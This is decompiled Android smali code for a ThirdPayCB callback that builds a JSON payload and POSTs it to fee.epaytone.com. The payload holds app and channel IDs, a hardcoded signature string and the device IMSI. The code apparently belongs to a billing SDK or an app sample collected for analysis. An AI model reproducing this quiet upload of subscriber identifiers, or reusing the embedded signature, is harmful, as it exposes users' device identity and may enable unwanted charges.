.class Lcom/bb_sz/ndk/upload/ThirdPayCB$1;
.super Ljava/lang/Object;
.source "ThirdPayCB.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bb_sz/ndk/upload/ThirdPayCB;->httpRequest(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bb_sz/ndk/upload/ThirdPayCB;

.field final synthetic val$appid:Ljava/lang/String;

.field final synthetic val$cid:Ljava/lang/String;

.field final synthetic val$jarVersion:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/bb_sz/ndk/upload/ThirdPayCB;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bb_sz/ndk/upload/ThirdPayCB;

    .prologue
    .line 51
    iput-object p1, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->this$0:Lcom/bb_sz/ndk/upload/ThirdPayCB;

    iput-object p2, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->val$appid:Ljava/lang/String;

    iput-object p3, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->val$cid:Ljava/lang/String;

    iput-object p4, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->val$jarVersion:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    .line 54
    const/16 v4, 0x50

    .line 55
    .local v4, "port":I
    const-string v2, "fee.epaytone.com"

    .line 56
    .local v2, "host":Ljava/lang/String;
    const-string v3, "/epaytone/initRequest"

    .line 57
    .local v3, "path":Ljava/lang/String;
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 71
    .local v0, "da":Lorg/json/JSONObject;
    :try_start_0
    const-string v6, "appId"

    iget-object v7, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->val$appid:Ljava/lang/String;

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_7

    .line 72
    :goto_0
    :try_start_1
    const-string v6, "pupChannelId"

    iget-object v7, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->val$cid:Ljava/lang/String;

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_6

    .line 73
    :goto_1
    :try_start_2
    const-string v6, "signature"

    const-string v7, "zvr6VgMjqWS6B1kt7gjeo\\/bOz1K4nvr0djom91KDhAwuCiY\\/gGBRQW+MCN+FGV3nQcr8nKrDeNKc8s80j2f67P9jhLPqkgpnJDUwPDU0PTwyNTE3NDY="

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_5

    .line 74
    :goto_2
    :try_start_3
    const-string v6, "jarVersion"

    iget-object v7, p0, Lcom/bb_sz/ndk/upload/ThirdPayCB$1;->val$jarVersion:Ljava/lang/String;

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_4

    .line 75
    :goto_3
    :try_start_4
    const-string v6, "cid"

    const-string v7, "5120"

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_3

    .line 76
    :goto_4
    :try_start_5
    const-string v6, "apkVersion"

    const-string v7, "2.0.0.0"

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_2

    .line 77
    :goto_5
    :try_start_6
    const-string v6, "imsi"

    const-string v7, "imsi"

    invoke-static {v7}, Lcom/bb_sz/ndk/App;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_1

    .line 78
    :goto_6
    :try_start_7
    const-string v6, "vercode"

    const-string v7, "pxsk120"

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_7
    .catch Lorg/json/JSONException; {:try_start_7 .. :try_end_7} :catch_0

    .line 129
    :goto_7
    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    .line 131
    .local v1, "data":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuffer;

    invoke-direct {v5}, Ljava/lang/StringBuffer;-><init>()V

    .line 132
    .local v5, "sb":Ljava/lang/StringBuffer;
    const-string v6, "POST "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, " HTTP/1.1"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 133
    const-string v6, "Host: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 134
    const-string v6, "User-Agent:XX_Shell_a"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 135
    const-string v6, "Accept-Language:zh-cn"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 136
    const-string v6, "Accept-Encoding:deflate"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 137
    const-string v6, "Accept:*/*"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 138
    const-string v6, "Connection:Keep-Alive"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 139
    const-string v6, "Content-Type: application/x-www-form-urlencoded"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 140
    const-string v6, "Content-Length: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 141
    const-string v6, "\r\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 142
    invoke-virtual {v5, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 143
    invoke-virtual {v5}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v2, v4, v6}, Lcom/bb_sz/ndk/App;->post(Ljava/lang/String;ILjava/lang/String;)V

    .line 144
    return-void

    .line 78
    .end local v1    # "data":Ljava/lang/String;
    .end local v5    # "sb":Ljava/lang/StringBuffer;
    :catch_0
    move-exception v6

    goto/16 :goto_7

    .line 77
    :catch_1
    move-exception v6

    goto/16 :goto_6

    .line 76
    :catch_2
    move-exception v6

    goto/16 :goto_5

    .line 75
    :catch_3
    move-exception v6

    goto/16 :goto_4

    .line 74
    :catch_4
    move-exception v6

    goto/16 :goto_3

    .line 73
    :catch_5
    move-exception v6

    goto/16 :goto_2

    .line 72
    :catch_6
    move-exception v6

    goto/16 :goto_1

    .line 71
    :catch_7
    move-exception v6

    goto/16 :goto_0
.end method
